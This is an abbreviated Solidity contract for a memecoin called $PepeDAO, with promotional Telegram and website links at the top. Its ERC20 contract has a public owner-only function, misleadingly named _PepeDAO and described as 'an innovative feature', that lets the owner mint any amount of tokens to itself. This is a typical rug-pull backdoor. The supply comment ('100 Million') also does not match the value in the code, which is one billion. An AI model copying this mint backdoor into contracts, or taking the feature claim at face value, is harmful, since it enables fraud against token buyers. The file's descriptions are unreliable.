//
// $PepeDAO proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PepeDaoCN
//  📱 Website::https://www.pepe-dao.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepeDAO(uint256 amount) public onlyOwner {
 _PepeDAO(msg.sender, amount);
    }
    ...
    function _PepeDAO(address account, uint256 amount) internal virtual {
...
contract $PepeDAO is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe DAO", "PDAO") {
    _PepeDAO(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}